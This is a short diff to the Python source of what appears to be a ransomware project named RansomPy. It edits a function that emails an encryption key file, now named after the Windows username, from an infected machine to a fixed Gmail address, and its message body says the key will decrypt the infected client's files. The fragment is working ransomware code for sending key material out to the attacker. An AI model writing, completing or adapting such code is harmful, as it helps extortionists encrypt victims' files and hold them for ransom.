@@ -8,6 +8,7 @@ from email import encoders
 
 fromaddr = "FROM_TO@gmail.com"
 toaddr = "DEST_TO@gmail.com"
+usr = os.environ["USERNAME"]
 
 def send_key():
     try:
@@ -15,10 +16,10 @@ def send_key():
         msg['From'] = fromaddr
         msg['To'] = toaddr
         msg['Subject'] = "The server you sending a key from the client"
-        body = "Body_of_the_mail"
+        body = "This key will be used to decrypt the files on the client infected"
         msg.attach(MIMEText(body, 'plain'))
-        filename = "client1.key"
-        attachment = open("\\Users\\Zalman\\Downloads\\RansomPy-master\\RansomPy-master\\client1.key", "rb")
+        filename = "%s.key" %(usr)
+        attachment = open(filename, "rb")
         p = MIMEBase('application', 'octet-stream')
         p.set_payload((attachment).read())
         encoders.encode_base64(p)
